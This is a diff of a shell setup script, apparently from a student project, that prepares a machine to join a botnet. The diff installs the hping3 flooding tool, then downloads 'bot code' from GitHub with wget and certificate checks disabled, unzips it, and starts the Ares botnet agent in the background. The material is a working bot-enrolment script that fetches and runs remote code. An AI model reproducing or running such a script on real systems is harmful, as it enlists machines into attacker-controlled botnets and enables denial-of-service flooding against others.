@@ -57,11 +57,14 @@ echo ""
 sudo apt-get install hping3 -y
 echo ""
 
-# Clone the botnet repo & connect to the botnet
-echo "Cloning the botnet code repository..."
-git clone https://github.com/kmanwar89/460SP.git --no-check-certificate
+# Download the bot code and connect
+echo "Downloading the bot code..."
+cd ~
+wget https://github.com/kmanwar89/460SP/archive/master.zip --no-check-certificate
+mv master master.zip
+unzip master.zip
 sleep 1
 echo ""
 echo ""
 echo "Connecting to the botnet!"
-cd ~/460SP/Ares/agent/ && python2.6 agent.py &
+cd 460SP-master/Ares/agent/ && python2.6 agent.py &
